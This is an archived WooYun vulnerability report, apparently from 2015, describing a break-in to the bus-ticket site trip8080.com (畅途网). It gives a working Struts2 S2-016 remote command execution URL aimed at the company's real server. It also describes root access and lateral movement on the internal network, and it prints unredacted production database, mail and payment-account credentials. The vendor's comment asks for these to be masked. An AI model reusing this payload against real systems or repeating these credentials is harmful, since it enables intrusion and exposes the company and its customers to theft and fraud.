{"id": 37720, "wybug_id": "wooyun-2015-099081", "wybug_title": "畅途网内网漫游记", "wybug_corp": "畅途网", "wybug_author": "Forever80s", "wybug_date": "2015-03-03 15:13", "wybug_open_date": "2015-04-17 15:14", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-17：\t细节向公众公开  简要描述： 学大牛们们漫游一下内网 详细说明：  发现一个网站http://mis.trip8080.com有s2-016漏洞\nhttp://mis.trip8080.com/station/rand.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27id%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29\nroot权限getshell ，免提式然后发现这个主机可以管理好多网站包括主站ok看看这个是一个服务器目录\n\n每个服务器目录下都有war就是网站：长途汽车站信息管理系统-畅途网\n\n我们再看看其他网站\n\nwar都是网站目录\n\n有一个oracle用户其home目录里也有好多服务器\n\n继续看web服务器里有什么\n\n这个是主站\n\n看到最后修改日期了吗？怎么知道是主站呢？我们看一个特征文件\n\n你可以访问一下\nhttp://www.trip8080.com/5ac73da4824100ac52100d7577aa8fae.html\n这里还有主站的cron最新备份\n\n该主机是在内网\nifconfig====================================================================================================================================eth0      Link encap:Ethernet  HWaddr E4:1F:13:68:DC:60            inet addr:172.19.0.31  Bcast:172.19.0.255  Mask:255.255.255.0          inet6 addr: fe80::e61f:13ff:fe68:dc60/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:4282524440 errors:36366664 dropped:36376895 overruns:0 frame:36366664          TX packets:5406440041 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:1069298496031 (995.8 GiB)  TX bytes:3111623545115 (2.8 TiB)          Interrupt:169 Memory:92000000-92012800 lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:2238316 errors:0 dropped:0 overruns:0 frame:0          TX packets:2238316 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:351788488 (335.4 MiB)  TX bytes:351788488 (335.4 MiB)usb0      Link encap:Ethernet  HWaddr E6:1F:13:5A:DC:63            inet6 addr: fe80::e41f:13ff:fe5a:dc63/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:22286280 errors:0 dropped:0 overruns:0 frame:0          TX packets:36 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:1448608200 (1.3 GiB)  TX bytes:6752 (6.5 KiB)\n找点敏感信息主站支付配置文件\n//home/oracle/jbossweb2/slwt.war/WEB-INF/config/trip8080-payment.xml<?xml version=\"1.0\" encoding=\"UTF-8\"?><beans xmlns=\"http://www.springframework.org/schema/beans\"\txmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\txmlns:p=\"http://www.springframework.org/schema/p\"\txsi:schemaLocation=\"\thttp://www.springframework.org/schema/beans \thttp://www.springframework.org/schema/beans/spring-beans-3.0.xsd\">\t<bean id=\"trip8080PaymentConfiguration\" class=\"com.trip8080.core.payment.PaymentConfiguration\">\t\t<property name=\"config\">\t\t\t<map>\t\t\t\t<!-- 支付宝支付 \t\t\t\t<entry key=\"alipayUrl\" value=\"http://172.18.0.100/publicservice/alipay_pay.action\"></entry>\t\t\t\t<entry key=\"alipayUrlPremium\" value=\"http://172.18.0.100/publicservice/premium_alipay_pay.action\"></entry>\t\t\t\t<entry key=\"alipayReturnUrl\" value=\"http://localhost:8080/slwt/payReturn.jspx\"></entry>\t\t\t\t<entry key=\"alipayReturnUrlPre\" value=\"http://localhost:8080/slwt/alipayReturn.jspx\"></entry>-->\t\t\t\t\t\t\t\t<!-- -->\t\t\t\t<entry key=\"alipayUrl\" value=\"http://ps.trip8080.com/alipay_pay.action\"></entry>\t\t\t\t<entry key=\"alipayUrlPremium\" value=\"http://ps.trip8080.com/premium_alipay_pay.action\"></entry>\t\t\t\t<entry key=\"alipayReturnUrl\" value=\"http://www.trip8080.com/payReturn.jspx\"></entry>\t\t\t\t \t\t\t\t\t\t\t\t<!-- 银联支付 \t\t\t\t<entry key=\"unionpayUrl\" value=\"http://172.18.0.100/publicservice/union_pay.action\"></entry>\t\t\t\t<entry key=\"unionpayReturnUrl\" value=\"http://localhost:8080/slwt/payReturn.jspx\"></entry>\t\t\t\t-->\t\t\t\t<!--  -->\t\t\t\t<entry key=\"unionpayUrl\" value=\"http://ps.trip8080.com/union_pay.action\"></entry>\t\t\t\t<entry key=\"unionpayReturnUrl\" value=\"http://www.trip8080.com/payReturn.jspx\"></entry>\t\t\t\t\t\t\t\t<!-- 财付通支付 -->\t\t\t\t <entry key=\"tenpayUrl\" value=\"http://ps.trip8080.com/tencent_pay.action\"></entry>\t\t\t\t <entry key=\"tenpayReturnUrl\" value=\"http://www.trip8080.com/payReturn.jspx\"></entry>\t\t\t\t\t\t\t\t <!-- 最新版的支付接口 -->\t\t\t\t <entry key=\"payUrl\" value=\"http://ps.trip8080.com/pay.action\"></entry>\t\t\t\t <entry key=\"returnUrl\" value=\"http://www.trip8080.com/payReturn.jspx\"></entry>\t\t\t\t<!--申请退款接口 个人账户到支付账户 -->\t\t\t\t<entry key=\"applyReturn\" value=\"http://tts.pub/publicservice/applyPersonalPayment.action\"></entry>\t\t\t\t<!--取消退款接口 -->\t\t\t\t<entry key=\"rmoveReturn\" value=\"http://tts.pub/publicservice/applyRemoveReturn.action\"></entry>\t\t\t\t<!--公司账户到个人账户或支付账户 -->\t\t\t\t<entry key=\"applyReturnToPay\" value=\"http://tts.pub/publicservice/applyReturnToPerOrPay.action\"></entry>\t\t\t</map>\t\t</property>\t</bean></beans>\n主站数据库配置\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><beans xmlns=\"http://www.springframework.org/schema/beans\"\txmlns:context=\"http://www.springframework.org/schema/context\"\txmlns:tx=\"http://www.springframework.org/schema/tx\"\txmlns:aop=\"http://www.springframework.org/schema/aop\"\txmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\txmlns:p=\"http://www.springframework.org/schema/p\"\txsi:schemaLocation=\"\thttp://www.springframework.org/schema/beans \thttp://www.springframework.org/schema/beans/spring-beans-3.0.xsd\thttp://www.springframework.org/schema/context \thttp://www.springframework.org/schema/context/spring-context-3.0.xsd\t\thttp://www.springframework.org/schema/tx \thttp://www.springframework.org/schema/tx/spring-tx-3.0.xsd\thttp://www.springframework.org/schema/aop\thttp://www.springframework.org/schema/aop/spring-aop-3.0.xsd\">\t<!-- 主库数据源 -->\t<bean id=\"datasourceOracle\" class=\"org.apache.commons.dbcp.BasicDataSource\">\t\t<property name=\"driverClassName\" value=\"oracle.jdbc.OracleDriver\" />\t\t<property name=\"url\" value=\"jdbc:oracle:thin:@//tts.oranew:1521/conn2\" />              \t<property name=\"username\" value=\"prod\" />\t\t<property name=\"password\" value=\"ttsprodyfzx\" />\t\t<property name=\"maxActive\" value=\"500\" />\t\t<property name=\"initialSize\" value=\"20\" />\t\t<property name=\"maxWait\" value=\"360000\" />\t\t<property name=\"minIdle\" value=\"10\" />\t\t<property name=\"maxIdle\" value=\"50\" />\t</bean>\t<!-- 备库数据源 -->\t<bean id=\"slaveDataSource\" class=\"org.apache.commons.dbcp.BasicDataSource\">\t\t<property name=\"driverClassName\" value=\"oracle.jdbc.OracleDriver\" />\t\t<property name=\"url\" value=\"jdbc:oracle:thin:@//tts.oranew:1521/conn2\"/> \t\t<property name=\"username\" value=\"prod\" />\t\t<property name=\"password\" value=\"ttsprodyfzx\" />\t\t<property name=\"maxActive\" value=\"500\" />\t\t<property name=\"initialSize\" value=\"20\" />\t\t<property name=\"maxWait\" value=\"360000\" />\t\t<property name=\"minIdle\" value=\"10\" />\t\t<property name=\"maxIdle\" value=\"50\" />\t</bean>    <!-- 主库JDBC -->    <bean id=\"jdbcTemplateOracle\" class=\"org.springframework.jdbc.core.JdbcTemplate\">\t\t<property name=\"dataSource\" ref=\"datasourceOracle\"></property>\t</bean>\t<!-- 备库JDBC -->    <bean id=\"jdbcTemplateSlave\" class=\"org.springframework.jdbc.core.JdbcTemplate\">\t\t<property name=\"dataSource\" ref=\"slaveDataSource\"></property>\t</bean>\t<!-- 事务配置 -->\t<bean id=\"txManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\" p:dataSource-ref=\"datasourceOracle\"></bean>\t<!-- 开启事务 -->\t<tx:annotation-driven transaction-manager=\"txManager\"/></beans>\n应该是支付宝帐号\n#alipaySellerEmail=ttstejie@yahoo.cnalipaySellerEmail=lizhenls@163.comserver=smtp.exmail.qq.comfrom=service@trip8080.comuser=service@trip8080.compassword=025changtuemailEncode=GBKdelay_time=30backpwdUrl=http\\://192.168.1.135\\:8080/slwtcronExpress=0 09-59 11 * * ?\n大量帐号密码这里不一一列举啦漫游一下内网吧暂时没公网ip，就不弹shell了，走一下web代理吧\n\n基本上整个系统沦陷了吧   漏洞证明：     修复方案：     版权声明：转载请注明来源 Forever80s@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-03-03 18:47 厂商回复： 非常感谢，我们会尽快安排修改！请留下您的联系方式 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-09 15:58 |    \t\t畅途网(乌云厂商)\t\t \n  希望能够对配置文件进行打码或者删图操作，以避免引起不必要的纠纷。    \n     2015-04-02 23:10 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:16        | Wow~~~哈哈~~~)\t\t \n  厂商态度不错，哈哈，另外确实要打得一手号码才行呀，否则还是会给企业带来信息泄露的。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}